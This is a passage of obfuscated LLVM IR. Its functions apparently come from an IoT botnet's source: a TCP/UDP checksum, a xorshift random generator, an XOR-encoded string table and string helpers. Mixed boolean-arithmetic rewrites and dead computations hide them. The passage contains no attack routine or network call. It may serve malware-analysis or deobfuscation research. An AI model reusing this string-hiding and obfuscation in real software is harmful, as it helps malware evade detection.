  %61 = xor i64 %60, -1
  %62 = and i64 -1, %61
  %63 = xor i64 -1, -1
  %64 = and i64 %60, %63
  %65 = or i64 %62, %64
  %66 = xor i64 %60, -1
  %67 = trunc i64 %65 to i16
  ret i16 %67
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, 123281236
  %32 = add i32 %31, %29
  %33 = sub i32 %32, 123281236
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = sub i32 %37, 1780727789
  %39 = sub i32 %38, 2
  %40 = add i32 %39, 1780727789
  %41 = sub nsw i32 %37, 2
  store i32 %40, i32* %8, align 4
  br label %23

; <label>:42:                                     ; preds = %23
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, 1
  br i1 %44, label %45, label %54

; <label>:45:                                     ; preds = %42
  %46 = load i16*, i16** %9, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = load i32, i32* %12, align 4
  %51 = sub i32 0, %49
  %52 = sub i32 %50, %51
  %53 = add i32 %50, %49
  store i32 %52, i32* %12, align 4
  br label %54

; <label>:54:                                     ; preds = %45, %42
  %55 = load i32, i32* %10, align 4
  %56 = lshr i32 %55, 16
  %57 = xor i32 65535, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 65535
  %61 = load i32, i32* %12, align 4
  %62 = sub i32 0, %61
  %63 = sub i32 0, %59
  %64 = add i32 %62, %63
  %65 = sub i32 0, %64
  %66 = add i32 %61, %59
  store i32 %65, i32* %12, align 4
  %67 = load i32, i32* %10, align 4
  %68 = xor i32 65535, -1
  %69 = xor i32 %67, %68
  %70 = and i32 %69, %67
  %71 = and i32 %67, 65535
  %72 = load i32, i32* %12, align 4
  %73 = sub i32 0, %70
  %74 = sub i32 %72, %73
  %75 = add i32 %72, %70
  store i32 %74, i32* %12, align 4
  %76 = load i32, i32* %11, align 4
  %77 = lshr i32 %76, 16
  %78 = xor i32 65535, -1
  %79 = xor i32 %77, %78
  %80 = and i32 %79, %77
  %81 = and i32 %77, 65535
  %82 = load i32, i32* %12, align 4
  %83 = sub i32 %82, -1506927480
  %84 = add i32 %83, %80
  %85 = add i32 %84, -1506927480
  %86 = add i32 %82, %80
  store i32 %85, i32* %12, align 4
  %87 = load i32, i32* %11, align 4
  %88 = xor i32 %87, -1
  %89 = xor i32 65535, -1
  %90 = xor i32 58811728, -1
  %91 = or i32 %88, %89
  %92 = or i32 58811728, %90
  %93 = xor i32 %91, -1
  %94 = and i32 %93, %92
  %95 = and i32 %87, 65535
  %96 = load i32, i32* %12, align 4
  %97 = sub i32 %96, 963348594
  %98 = add i32 %97, %94
  %99 = add i32 %98, 963348594
  %100 = add i32 %96, %94
  store i32 %99, i32* %12, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 6
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i16
  %105 = call zeroext i16 @htons(i16 zeroext %104) #7
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = sub i32 %107, -1702224319
  %109 = add i32 %108, %106
  %110 = add i32 %109, -1702224319
  %111 = add i32 %107, %106
  store i32 %110, i32* %12, align 4
  %112 = load i16, i16* %7, align 2
  %113 = zext i16 %112 to i32
  %114 = load i32, i32* %12, align 4
  %115 = sub i32 0, %114
  %116 = sub i32 0, %113
  %117 = add i32 %115, %116
  %118 = sub i32 0, %117
  %119 = add i32 %114, %113
  store i32 %118, i32* %12, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %54
  %121 = load i32, i32* %12, align 4
  %122 = lshr i32 %121, 16
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %124, label %141

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %12, align 4
  %126 = xor i32 %125, -1
  %127 = xor i32 65535, -1
  %128 = xor i32 506942800, -1
  %129 = or i32 %126, %127
  %130 = or i32 506942800, %128
  %131 = xor i32 %129, -1
  %132 = and i32 %131, %130
  %133 = and i32 %125, 65535
  %134 = load i32, i32* %12, align 4
  %135 = lshr i32 %134, 16
  %136 = sub i32 0, %132
  %137 = sub i32 0, %135
  %138 = add i32 %136, %137
  %139 = sub i32 0, %138
  %140 = add i32 %132, %135
  store i32 %139, i32* %12, align 4
  br label %120

; <label>:141:                                    ; preds = %120
  %142 = load i32, i32* %12, align 4
  %143 = xor i32 %142, -1
  %144 = and i32 -1, %143
  %145 = xor i32 -1, -1
  %146 = and i32 %142, %145
  %147 = or i32 %144, %146
  %148 = xor i32 %142, -1
  %149 = trunc i32 %147 to i16
  ret i16 %149
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 515799946, %15
  %17 = xor i32 515799946, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, 515799946
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %31, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %31, %30
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 445803677, %40
  %42 = xor i32 445803677, -1
  %43 = and i32 %39, %42
  %44 = xor i32 %38, -1
  %45 = and i32 %44, 445803677
  %46 = and i32 %38, %42
  %47 = or i32 %41, %43
  %48 = or i32 %45, %46
  %49 = xor i32 %47, %48
  %50 = xor i32 %39, %38
  store i32 %49, i32* @w, align 4
  %51 = load i32, i32* @w, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %16, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 %10, -1542160665
  %12 = add i32 %11, -1
  %13 = add i32 %12, -1542160665
  %14 = add nsw i32 %10, -1
  store i32 %13, i32* %4, align 4
  %15 = icmp ne i32 %10, 0
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %9
  %17 = call i32 @rand_next()
  %18 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %19 = call i32 @util_strlen(i8* %18)
  %20 = urem i32 %17, %19
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = load i8*, i8** %3, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %3, align 8
  store i8 %23, i8* %24, align 1
  br label %9

; <label>:26:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i32, i32* @table_key, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 255, -1
  %21 = xor i32 %19, %20
  %22 = and i32 %21, %19
  %23 = and i32 %19, 255
  %24 = trunc i32 %22 to i8
  store i8 %24, i8* %6, align 1
  %25 = load i32, i32* @table_key, align 4
  %26 = lshr i32 %25, 16
  %27 = xor i32 255, -1
  %28 = xor i32 %26, %27
  %29 = and i32 %28, %26
  %30 = and i32 %26, 255
  %31 = trunc i32 %29 to i8
  store i8 %31, i8* %7, align 1
  %32 = load i32, i32* @table_key, align 4
  %33 = lshr i32 %32, 24
  %34 = xor i32 %33, -1
  %35 = xor i32 255, -1
  %36 = xor i32 1695105565, -1
  %37 = or i32 %34, %35
  %38 = or i32 1695105565, %36
  %39 = xor i32 %37, -1
  %40 = and i32 %39, %38
  %41 = and i32 %33, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %134, %1
  %44 = load i32, i32* %3, align 4
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %139

; <label>:50:                                     ; preds = %43
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, -1
  %62 = and i32 1588941527, %61
  %63 = xor i32 1588941527, -1
  %64 = and i32 %60, %63
  %65 = xor i32 %52, -1
  %66 = and i32 %65, 1588941527
  %67 = and i32 %52, %63
  %68 = or i32 %62, %64
  %69 = or i32 %66, %67
  %70 = xor i32 %68, %69
  %71 = xor i32 %60, %52
  %72 = trunc i32 %70 to i8
  store i8 %72, i8* %58, align 1
  %73 = load i8, i8* %6, align 1
  %74 = zext i8 %73 to i32
  %75 = load %struct.table_value*, %struct.table_value** %4, align 8
  %76 = getelementptr inbounds %struct.table_value, %struct.table_value* %75, i32 0, i32 0
  %77 = load i8*, i8** %76, align 8
  %78 = load i32, i32* %3, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = xor i32 %82, -1
  %84 = and i32 %74, %83
  %85 = xor i32 %74, -1
  %86 = and i32 %82, %85
  %87 = or i32 %84, %86
  %88 = xor i32 %82, %74
  %89 = trunc i32 %87 to i8
  store i8 %89, i8* %80, align 1
  %90 = load i8, i8* %7, align 1
  %91 = zext i8 %90 to i32
  %92 = load %struct.table_value*, %struct.table_value** %4, align 8
  %93 = getelementptr inbounds %struct.table_value, %struct.table_value* %92, i32 0, i32 0
  %94 = load i8*, i8** %93, align 8
  %95 = load i32, i32* %3, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = sext i8 %98 to i32
  %100 = xor i32 %99, -1
  %101 = and i32 -1594668415, %100
  %102 = xor i32 -1594668415, -1
  %103 = and i32 %99, %102
  %104 = xor i32 %91, -1
  %105 = and i32 %104, -1594668415
  %106 = and i32 %91, %102
  %107 = or i32 %101, %103
  %108 = or i32 %105, %106
  %109 = xor i32 %107, %108
  %110 = xor i32 %99, %91
  %111 = trunc i32 %109 to i8
  store i8 %111, i8* %97, align 1
  %112 = load i8, i8* %8, align 1
  %113 = zext i8 %112 to i32
  %114 = load %struct.table_value*, %struct.table_value** %4, align 8
  %115 = getelementptr inbounds %struct.table_value, %struct.table_value* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* %3, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = load i8, i8* %119, align 1
  %121 = sext i8 %120 to i32
  %122 = xor i32 %121, -1
  %123 = and i32 1192536285, %122
  %124 = xor i32 1192536285, -1
  %125 = and i32 %121, %124
  %126 = xor i32 %113, -1
  %127 = and i32 %126, 1192536285
  %128 = and i32 %113, %124
  %129 = or i32 %123, %125
  %130 = or i32 %127, %128
  %131 = xor i32 %129, %130
  %132 = xor i32 %121, %113
  %133 = trunc i32 %131 to i8
  store i8 %133, i8* %119, align 1
  br label %134

; <label>:134:                                    ; preds = %50
  %135 = load i32, i32* %3, align 4
  %136 = sub i32 0, 1
  %137 = sub i32 %135, %136
  %138 = add nsw i32 %135, 1
  store i32 %137, i32* %3, align 4
  br label %43

; <label>:139:                                    ; preds = %43
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %16

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = sub i32 %11, 558510500
  %13 = add i32 %12, 1
  %14 = add i32 %13, 558510500
  %15 = add nsw i32 %11, 1
  store i32 %14, i32* %3, align 4
  br label %4

; <label>:16:                                     ; preds = %4
  %17 = load i32, i32* %3, align 4
  ret i32 %17
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strncmp(i8*, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %21, label %17

; <label>:17:                                     ; preds = %3
  %18 = load i32, i32* %9, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17, %3
  store i8 0, i8* %4, align 1
  br label %43

; <label>:22:                                     ; preds = %17
  br label %23

; <label>:23:                                     ; preds = %41, %22
  %24 = load i32, i32* %7, align 4
  %25 = sub i32 %24, 857758214
  %26 = add i32 %25, -1
  %27 = add i32 %26, 857758214
  %28 = add nsw i32 %24, -1
  store i32 %27, i32* %7, align 4
  %29 = icmp ne i32 %24, 0
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %5, align 8
  %33 = load i8, i8* %31, align 1
  %34 = sext i8 %33 to i32
  %35 = load i8*, i8** %6, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %6, align 8
  %37 = load i8, i8* %35, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp ne i32 %34, %38
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %30
  store i8 0, i8* %4, align 1
  br label %43

; <label>:41:                                     ; preds = %30
  br label %23

; <label>:42:                                     ; preds = %23
  store i8 1, i8* %4, align 1
  br label %43

; <label>:43:                                     ; preds = %42, %40, %21
  %44 = load i8, i8* %4, align 1
  ret i8 %44
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strcmp(i8*, i8*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %8 = load i8*, i8** %4, align 8
  %9 = call i32 @util_strlen(i8* %8)
  store i32 %9, i32* %6, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* %6, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp ne i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %2
  store i8 0, i8* %3, align 1
  br label %37

; <label>:16:                                     ; preds = %2
  br label %17

; <label>:17:                                     ; preds = %35, %16
  %18 = load i32, i32* %6, align 4
  %19 = add i32 %18, -2036872491
  %20 = add i32 %19, -1
  %21 = sub i32 %20, -2036872491
  %22 = add nsw i32 %18, -1
  store i32 %21, i32* %6, align 4
  %23 = icmp ne i32 %18, 0
  br i1 %23, label %24, label %36

; <label>:24:                                     ; preds = %17
  %25 = load i8*, i8** %4, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %4, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  %29 = load i8*, i8** %5, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %5, align 8
  %31 = load i8, i8* %29, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp ne i32 %28, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %24
  store i8 0, i8* %3, align 1
  br label %37

; <label>:35:                                     ; preds = %24
  br label %17

; <label>:36:                                     ; preds = %17
  store i8 1, i8* %3, align 1
  br label %37

; <label>:37:                                     ; preds = %36, %34, %15
  %38 = load i8, i8* %3, align 1
  ret i8 %38
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = sub i32 %10, -1040094379
  %12 = add i32 %11, 1
  %13 = add i32 %12, -1040094379
  %14 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %13)
  %15 = load i32, i32* %5, align 4
  ret i32 %15
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %18, %3
  %12 = load i32, i32* %6, align 4
  %13 = sub i32 %12, -137435728
  %14 = add i32 %13, -1
  %15 = add i32 %14, -137435728
  %16 = add nsw i32 %12, -1
  store i32 %15, i32* %6, align 4
  %17 = icmp ne i32 %12, 0
  br i1 %17, label %18, label %24

; <label>:18:                                     ; preds = %11
  %19 = load i8*, i8** %8, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %8, align 8
  %21 = load i8, i8* %19, align 1
  %22 = load i8*, i8** %7, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %7, align 8
  store i8 %21, i8* %22, align 1
  br label %11

; <label>:24:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %13, %2
  %8 = load i32, i32* %4, align 4
  %9 = sub i32 0, -1
  %10 = sub i32 %8, %9
  %11 = add nsw i32 %8, -1
  store i32 %10, i32* %4, align 4
  %12 = icmp ne i32 %8, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %7
  %14 = load i8*, i8** %5, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %5, align 8
  store i8 0, i8* %14, align 1
  br label %7

; <label>:16:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

; <label>:11:                                     ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

; <label>:24:                                     ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

; <label>:29:                                     ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

; <label>:32:                                     ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

; <label>:37:                                     ; preds = %32, %29
  br label %38

; <label>:38:                                     ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %41, i64* %7, align 8
  %42 = load i64, i64* %7, align 8
  %43 = load i32, i32* %4, align 4
  %44 = sext i32 %43 to i64
  %45 = urem i64 %42, %44
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* %10, align 4
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = load i64, i64* %7, align 8
  %50 = udiv i64 %49, %48
  store i64 %50, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %51

; <label>:51:                                     ; preds = %114, %38
  %52 = load i32, i32* %6, align 4
  %53 = trunc i32 %52 to i8
  %54 = call i32 @util_isdigit(i8 signext %53)
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %62

; <label>:56:                                     ; preds = %51
  %57 = load i32, i32* %6, align 4
  %58 = sub i32 %57, -553436063
  %59 = sub i32 %58, 48
  %60 = add i32 %59, -553436063
  %61 = sub nsw i32 %57, 48
  store i32 %60, i32* %6, align 4
  br label %80

; <label>:62:                                     ; preds = %51
  %63 = load i32, i32* %6, align 4
  %64 = trunc i32 %63 to i8
  %65 = call i32 @util_isalpha(i8 signext %64)
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %78

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* %6, align 4
  %69 = trunc i32 %68 to i8
  %70 = call i32 @util_isupper(i8 signext %69)
  %71 = icmp ne i32 %70, 0
  %72 = select i1 %71, i32 55, i32 87
  %73 = load i32, i32* %6, align 4
